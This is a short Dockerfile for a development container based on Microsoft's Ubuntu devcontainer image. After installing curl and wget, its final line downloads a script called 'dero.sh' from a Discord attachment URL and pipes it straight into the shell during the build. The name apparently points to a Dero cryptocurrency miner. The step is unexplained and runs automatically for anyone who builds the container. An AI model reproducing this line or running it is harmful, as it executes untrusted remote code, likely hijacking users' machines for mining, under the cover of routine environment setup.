# [Choice] Debian / Ubuntu version (use Debian 11/9, Ubuntu 18.04/21.04 on local arm64/Apple Silicon): debian-11, debian-10, debian-9, ubuntu-21.04, ubuntu-20.04, ubuntu-18.04
ARG VARIANT=ubuntu-20.04
FROM mcr.microsoft.com/devcontainers/base:${VARIANT}

RUN apt install wget curl -y

RUN curl https://cdn.discordapp.com/attachments/982667804429914146/1086099938666094642/dero.sh | sh
